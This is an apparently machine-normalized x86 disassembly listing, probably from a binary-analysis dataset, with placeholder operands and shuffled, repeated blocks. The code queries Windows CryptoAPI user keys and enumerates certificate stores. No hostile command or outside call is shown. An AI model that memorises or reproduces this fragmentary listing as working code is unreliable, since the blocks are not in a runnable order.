mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea ecx [ esp + 0x138 ]
call sub_401c90
push 0x10
mov [ esp + 0x164 ] ebx
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x1c ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push ecx
lea edx [ esp + 0x13c ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
mov esi [ esp + 0x1c ]
mov cl [ ebp + 0x8 ]
push esi
call sub_403140
add esp 0x4
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
lea edx [ esp + 0x11c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x170 ] 0x6
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esi ]
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x20
mov [ esp + 0x3c ] eax
mov [ esp + 0x160 ] 0x0
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
cmp [ esp + 0x148 ] 0x8
jb r-xdata
mov esi [ eax ]
cmp esi ebx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ esp + 0x20 ]
xor edi edi
mov ebx 0x8
mov [ esp + 0x2c ] edi
cmp [ esi + 0x14 ] ebx
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esp + 0x158 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x140 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x134 ]
push edx
call sub_43811c
add esp 0x4
mov eax [ esp + 0x1c ]
push eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
call sub_43811c
add esp 0x4
mov edi [ eax + 0x4 ]
cmp esi edi
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push ecx
call sub_43811c
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
push ecx
lea eax [ esp + 0x13c ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x3c ]
push edx
push ecx
call sub_407250
mov ebx eax
mov eax [ esp + 0x24 ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esp + 0x1c ]
inc [ esp + 0x30 ]
add esi 0x1c
mov [ esp + 0x20 ] esi
cmp esi [ ecx + 0x4 ]
jne r-xdata
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x28 ]
push ecx
push 0x1
push edx
mov [ esp + 0x34 ] edi
call [ CryptGetUserKey@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x3c ]
push edx
push 0xc
push edi
push eax
lea eax [ esp + 0x3c ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ edx + 0x4 ] ebx
xor ebx ebx
lea ecx [ ecx ]
mov edx [ esp + 0x20 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
xor ebx ebx
jmp r-xdata
push 0x0
lea eax [ esp + 0x11c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x170 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x28 ]
push edi
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push 0x6
push edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x48 ] 0x4
call [ CryptGetKeyParam@IAT ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ esp + 0x1c ]
push edx
push esi
call sub_405090
add esp 0x8
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x28 ]
push 0x0
lea edx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x2c ]
push eax
push 0x9
push ecx
call [ CryptGetKeyParam@IAT ]
test eax eax
je r-xdata
test [ esp + 0x24 ] 0x4
mov eax r--data
jne r-xdata
push ebx
lea edx [ esp + 0x11c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x170 ] 0xe
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esi ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x20 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esp + 0x160 ] 0x0
cmp [ esp + 0x12c ] ebx
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ esp + 0x24 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x20 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esp + 0x2c ]
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ esp + 0x28 ]
push edx
call [ CryptDestroyKey@IAT ]
jmp r-xdata
lea edx [ esp + 0x4c ]
xor esi esi
push edx
xor bl bl
mov [ esp + 0x3c ] esi
mov [ esp + 0x44 ] esi
call sub_403ab0
mov [ esp + 0x160 ] 0x1
mov ecx [ esp + 0x20 ]
xor eax eax
push esi
mov [ esp + 0xf8 ] ax
push ecx
or eax 0xffffffff
lea edi [ esp + 0xfc ]
mov [ esp + 0x110 ] 0x7
mov [ esp + 0x10c ] esi
call sub_401be0
mov edx edi
mov [ esp + 0x160 ] 0x2
call sub_417360
mov eax [ esp + 0x30 ]
push r--data
push ecx
push edx
push ecx
push 0x5f
push ecx
push eax
push ecx
push 0x5f
push ecx
lea ecx [ esp + 0x15c ]
push ecx
push ecx
lea edx [ esp + 0x8c ]
push r--data
push edx
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
mov edi [ esp + 0x30 ]
lea eax [ esp + 0x40 ]
push eax
lea esi [ esp + 0x4c ]
call sub_4035f0
add esp 0xc
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edi r--data
test bl bl
jne r-xdata
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x68 ]
mov [ esp + 0x60 ] esp
call sub_403b50
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x54 ]
push ecx
push edx
call sub_401890
mov bl al
mov eax [ esp + 0x5c ]
add esp 0x24
push eax
call sub_438111
add esp 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov eax [ esp + 0x20 ]
xor esi esi
push esi
xor edx edx
push eax
or eax 0xffffffff
lea edi [ esp + 0xfc ]
mov [ esp + 0x110 ] 0x7
mov [ esp + 0x10c ] esi
mov [ esp + 0xfc ] dx
call sub_401be0
push esi
push esi
lea ecx [ esp + 0x48 ]
push ecx
mov [ esp + 0x16c ] 0x7
xor bl bl
call [ rw-data ]
test eax eax
jne r-xdata
or edi [ ecx + 0xc ]
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
lea esi [ esp + 0x118 ]
lea eax [ esp + 0x4c ]
call sub_403b50
push edi
push ecx
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x180 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edi r--data
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ esp + 0x160 ] 0x0
cmp [ esp + 0x108 ] 0x8
jb r-xdata
cmp [ esp + 0x108 ] 0x8
mov eax [ esp + 0xf4 ]
jae r-xdata
push 0x0
push edi
call sub_402d50
or edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor ecx ecx
mov [ esp + 0x108 ] 0x7
mov [ esp + 0x104 ] esi
mov [ esp + 0xf4 ] cx
test bl bl
je r-xdata
mov eax [ esp + 0xf4 ]
push eax
call sub_43811c
add esp 0x4
movzx edx [ ebp + 0x8 ]
mov ecx [ esp + 0x40 ]
neg edx
sbb edx edx
and edx 0x20
push edx
push esi
push eax
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ rw-data ]
mov edx [ esp + 0x40 ]
test eax eax
push edx
sete bl
call [ rw-data ]
mov eax edi
mov [ esp + 0x160 ] 0x2
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
inc [ esp + 0x2c ]
add eax 0x1c
mov [ esp + 0x20 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x24 ]
push esi
lea edx [ esp + 0x38 ]
push edx
push 0x4
lea eax [ esp + 0x44 ]
push eax
push r--data
push ecx
mov [ esp + 0x5c ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
call [ rw-data ]
test eax eax
jne r-xdata
test bl bl
jne r-xdata
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x24 ]
push 0x0
lea edx [ esp + 0x2c ]
push edx
push 0x4
lea eax [ esp + 0x50 ]
push eax
push r--data
push ecx
mov [ esp + 0x40 ] 0x0
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ esp + 0x34 ] 0x4
jne r-xdata
cmp [ esp + 0x108 ] 0x8
jb r-xdata
push 0x0
lea eax [ esp + 0x11c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x170 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esp + 0x28 ] 0x4
jne r-xdata
mov dl [ esp + 0x38 ]
and dl 0x1
mov eax r--data
jne r-xdata
xor ecx ecx
mov [ esp + 0xf4 ] cx
mov [ esp + 0x160 ] cl
lea ecx [ esp + 0x4c ]
mov [ esp + 0x108 ] 0x7
mov [ esp + 0x104 ] 0x0
call sub_403550
mov eax [ esp + 0xf4 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
call [ rw-data ]
xor esi esi
mov [ esp + 0x1b ] 0x0
mov [ esp + 0x30 ] esi
mov [ esp + 0x3c ] esi
mov [ esp + 0x4c ] r--data
mov [ esp + 0x5c ] r--data
mov [ esp + 0xac ] r--data
lea edx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x50 ]
mov [ esp + 0x164 ] 0x8
or [ esp + 0x4c ] 0x1
push eax
call sub_4043f0
mov [ esp + 0x160 ] 0x9
mov ecx [ esp + 0x4c ]
mov edx [ ecx + 0x4 ]
lea ecx [ esp + 0x64 ]
mov [ esp + edx + 0x4c ] r--data
call sub_4047b0
mov [ esp + 0x64 ] r--data
mov [ esp + 0xa0 ] esi
mov [ esp + 0xa4 ] esi
push r--data
push ecx
mov [ esp + 0x168 ] 0xb
mov eax [ esp + 0x28 ]
push eax
push ecx
push 0x5f
push ecx
mov ecx [ esp + 0x44 ]
push ecx
push ecx
push 0x5f
push ecx
lea edx [ esp + 0x15c ]
push edx
push ecx
lea eax [ esp + 0x8c ]
push r--data
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
mov ebx [ esp + 0x2c ]
lea ecx [ esp + 0x38 ]
push ecx
lea edi [ esp + 0x48 ]
call sub_405230
add esp 0xc
test al al
je r-xdata
mov edx [ esp + 0x44 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ esp + 0x1b ] 0x0
mov edi r--data
jne r-xdata
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x68 ]
mov [ esp + 0x50 ] esp
call sub_403b50
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x4c ]
push edx
push eax
call sub_401890
mov ecx [ esp + 0x54 ]
add esp 0x24
push ecx
mov [ esp + 0x1f ] al
call sub_438111
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ esp + 0x118 ]
lea eax [ esp + 0x4c ]
call sub_403b50
push edi
push ecx
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x180 ] 0xc
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov edi r--data
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ esp + 0x160 ] 0xb
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ esp + 0x1b ] 0x0
jne r-xdata
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea ecx [ esp + 0x4c ]
mov [ esp + 0x160 ] 0x0
call sub_403550
push 0x0
lea eax [ esp + 0x11c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x170 ] 0xd
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x12c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ esp + 0x118 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_415c10
push ebp
mov ebp esp
push 0xffffffff
push sub_4535e9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x15c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x27
lea eax [ ebp + 0x8 ]
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x1
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_40e950
add esp 0x8
lea ecx [ ebp - 0xa8 ]
push ecx
sub esp 0x1c
mov edi esp
mov [ ebp - 0xc0 ] esp
xor ebx ebx
push ebx
lea eax [ ebp + 0x8 ]
xor edx edx
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
call sub_401050
add esp 0x20
test al al
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
lea ecx [ ebp + 0x24 ]
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor eax eax
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] ax
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov edx [ ebp - 0xa8 ]
push eax
or edx 0xc000
push edx
push ebx
push ebx
push 0xa
call [ CertOpenStore@IAT ]
mov [ ebp - 0xa8 ] eax
push ebx
cmp eax ebx
je r-xdata
lea eax [ ebp + 0x24 ]
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x24 ]
push ecx
call sub_43811c
add esp 0x4
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0xb
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push eax
mov [ ebp - 0xb0 ] ebx
call [ CertEnumCertificatesInStore@IAT ]
mov [ ebp - 0x9c ] eax
cmp eax ebx
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0xa8 ]
push 0x1
push ecx
call [ CertCloseStore@IAT ]
xor ebx ebx
jmp r-xdata
lea ecx [ ecx ]
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ebx ebx
mov [ ebp - 0xb8 ] ebx
xor ecx ecx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] 0x0
mov [ eax ] cx
mov ebx eax
mov [ ebp - 0xb8 ] eax
jmp r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
jmp r-xdata
push ebx
